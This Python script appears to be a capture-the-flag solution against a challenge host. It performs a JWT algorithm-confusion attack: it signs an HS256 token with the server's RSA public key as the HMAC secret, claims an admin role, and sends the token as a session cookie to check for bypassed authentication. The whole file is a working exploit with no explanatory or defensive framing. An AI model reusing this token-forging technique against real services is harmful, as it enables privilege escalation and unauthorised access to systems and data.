import base64
import json
import hmac
import hashlib
import time
import requests

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

pem_full = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr72cu4HvEptWPVXPV/iJ
dvJJhlTJzK5BKOSLP2+HRVl7Z8XEJjyiJ/6RIRVvg/xlZckSGzIAcQInrXkLoJgF
uecQ3sy44ag0wT0YUBAHl1+7Cas4/60nPG+2t+Zj2MoVL4NO4iHadPQ9YDi/xNoo
Xq/m1n+VK5J+aYql8MEGMIiOp0YFyTYNqcWDP1vrCz/7OZ6yp8lw2YpgiayJZBWo
/YYx1jeIzLDbNphWsOJe0NUdG0xmRypnHVfqkF8u0hnjiIDiepW0UeqyvAXtOTRE
7Jyw97vTAiG/8wGqeFgE0dM9Ygw9k8mtiUI+Z2MG1A4HQrvjDlei/tXYcyQQ8rgH
7wIDAQAB
-----END PUBLIC KEY-----"""

# Extract base64 part
pem_body = "".join(pem_full.splitlines()[1:-1])

secrets = [
    pem_body.encode(),
    base64.b64decode(pem_body)
]

def forge_token(secret):
    header = {"alg": "HS256", "kid": "front-desk-2026", "typ": "JWT"}
    payload = {
        "iss": "paper-trail-office",
        "aud": "paper-trail-visitors",
        "sub": "afebdc42bcc2cd7a",
        "name": "Admin",
        "role": "admin",
        "iat": int(time.time()),
        "nbf": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    segments = [base64url_encode(json.dumps(header, separators=(",", ":")).encode()), base64url_encode(json.dumps(payload, separators=(",", ":")).encode())]
    signing_input = ".".join(segments).encode()
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    segments.append(base64url_encode(signature))
    return ".".join(segments)

for s in secrets:
    token = forge_token(s)
    r = requests.get("https://paper-trail-e2b88ccb94b9b1cb.tjc.tf/drawer", cookies={"paper_badge": token})
    if r.status_code != 401:
        print(f"SUCCESS")
        exit()
print("Failed")
